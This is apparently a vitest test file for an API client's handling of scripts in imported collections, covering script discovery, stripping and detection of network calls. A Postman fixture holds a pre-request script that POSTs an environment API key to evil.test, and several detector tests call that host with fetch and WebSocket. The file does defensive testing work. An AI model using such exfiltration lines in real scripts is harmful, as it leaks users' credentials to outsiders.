import { describe, expect, it } from 'vitest';
import { findScripts, scriptCallsNetwork, stripScripts } from './collectionScripts';
import { importPostman } from './postman';
import { newCollection, newFolder, newRequest, type Collection } from './types';

const collection = (over: Partial<Collection> = {}): Collection => ({ ...newCollection('Imported'), ...over });

describe('findScripts', () => {
  it('finds nothing in a script-free collection', () => {
    const c = collection({ items: [newRequest({ name: 'Get' })] });
    expect(findScripts(c)).toEqual([]);
  });

  it('treats whitespace-only scripts as absent', () => {
    const c = collection({
      items: [newRequest({ name: 'Get', script: { req: '   \n  ', res: '' }, tests: '\n' })],
    });
    expect(findScripts(c)).toEqual([]);
  });

  it('finds a collection-level script', () => {
    const c = collection({ script: { req: 'bru.setCollectionVar("a", 1);', res: '' } });
    expect(findScripts(c)).toEqual([
      { path: '', kind: 'pre-request', code: 'bru.setCollectionVar("a", 1);' },
    ]);
  });

  it('finds request pre-request, post-response and test scripts', () => {
    const c = collection({
      items: [newRequest({ name: 'Login', script: { req: 'PRE', res: 'POST' }, tests: 'TESTS' })],
    });
    expect(findScripts(c)).toEqual([
      { path: 'Login', kind: 'pre-request', code: 'PRE' },
      { path: 'Login', kind: 'post-response', code: 'POST' },
      { path: 'Login', kind: 'tests', code: 'TESTS' },
    ]);
  });

  it('reports the full path through nested folders', () => {
    const inner = { ...newFolder('v2'), items: [newRequest({ name: 'Login', tests: 'T' })] };
    const outer = { ...newFolder('Auth'), items: [inner] };
    expect(findScripts(collection({ items: [outer] }))).toEqual([
      { path: 'Auth / v2 / Login', kind: 'tests', code: 'T' },
    ]);
  });

  it('finds folder-level scripts', () => {
    const folder = { ...newFolder('Auth'), script: { req: 'F-PRE', res: '' }, items: [] };
    expect(findScripts(collection({ items: [folder] }))).toEqual([
      { path: 'Auth', kind: 'pre-request', code: 'F-PRE' },
    ]);
  });

  it('reports every script in the tree', () => {
    const c = collection({
      script: { req: 'C', res: '' },
      items: [
        { ...newFolder('A'), script: { req: 'F', res: '' }, items: [newRequest({ name: 'R1', tests: 'T1' })] },
        newRequest({ name: 'R2', script: { req: 'P2', res: '' } }),
      ],
    });
    expect(findScripts(c).map((f) => [f.path, f.kind])).toEqual([
      ['', 'pre-request'],
      ['A', 'pre-request'],
      ['A / R1', 'tests'],
      ['R2', 'pre-request'],
    ]);
  });
});

describe('stripScripts', () => {
  it('removes every script it can find', () => {
    const c = collection({
      script: { req: 'C', res: 'C2' },
      items: [
        { ...newFolder('A'), script: { req: 'F', res: 'F2' }, items: [newRequest({ name: 'R1', script: { req: 'P', res: 'Q' }, tests: 'T' })] },
      ],
    });
    expect(findScripts(stripScripts(c))).toEqual([]);
  });

  it('keeps the requests and structure intact', () => {
    const request = newRequest({
      name: 'Login',
      url: 'https://api.test/login',
      method: 'POST',
      tests: 'evil()',
    });
    const c = collection({ items: [{ ...newFolder('Auth'), items: [request] }] });

    const stripped = stripScripts(c);
    const folder = stripped.items[0];
    expect(folder.type).toBe('folder');
    if (folder.type !== 'folder') throw new Error('expected a folder');
    const kept = folder.items[0];
    expect(kept.type).toBe('request');
    if (kept.type !== 'request') throw new Error('expected a request');

    expect(kept.id).toBe(request.id);
    expect(kept.url).toBe('https://api.test/login');
    expect(kept.method).toBe('POST');
    expect(kept.tests).toBe('');
  });

  it('does not mutate the original', () => {
    const c = collection({ items: [newRequest({ name: 'R', tests: 'T' })] });
    stripScripts(c);
    expect(findScripts(c)).toHaveLength(1);
  });
});

describe('an imported Postman collection', () => {
  // The realistic threat: a collection file from elsewhere whose pre-request
  // script runs the moment the user hits Send.
  const malicious = JSON.stringify({
    info: { name: 'Vendor API' },
    item: [
      {
        name: 'Get token',
        request: { method: 'GET', url: 'https://vendor.test/token' },
        event: [
          { listen: 'prerequest', script: { exec: ['fetch("https://evil.test", {method:"POST", body: bru.getEnvVar("apiKey")});'] } },
          { listen: 'test', script: { exec: ['pm.test("ok", () => pm.response.to.have.status(200));'] } },
        ],
      },
    ],
  });

  it('surfaces the embedded scripts', () => {
    const found = findScripts(importPostman(malicious));
    expect(found).toHaveLength(2);
    expect(found[0].kind).toBe('pre-request');
    expect(found[0].code).toContain('evil.test');
    expect(found[0].path).toBe('Get token');
  });

  it('is safe to import once stripped, and still sends the request', () => {
    const stripped = stripScripts(importPostman(malicious));
    expect(findScripts(stripped)).toEqual([]);
    const item = stripped.items[0];
    if (item.type !== 'request') throw new Error('expected a request');
    expect(item.url).toBe('https://vendor.test/token');
    expect(item.method).toBe('GET');
  });
});

describe('scriptCallsNetwork', () => {
  it('flags a direct fetch() call', () => {
    expect(scriptCallsNetwork('fetch("https://evil.test", { method: "POST" });')).toBe(true);
  });

  it('flags XMLHttpRequest and WebSocket', () => {
    expect(scriptCallsNetwork('const x = new XMLHttpRequest();')).toBe(true);
    expect(scriptCallsNetwork('const ws = new WebSocket("wss://evil.test");')).toBe(true);
  });

  it('ignores scripts with no network call', () => {
    expect(scriptCallsNetwork('bru.setCollectionVar("x", 1);\nreq.setHeader("X-Trace", "abc");')).toBe(false);
    expect(scriptCallsNetwork('')).toBe(false);
  });

  it('does not flag "fetch" used as a plain identifier, not a call', () => {
    expect(scriptCallsNetwork('const fetchCount = 1;')).toBe(false);
  });
});
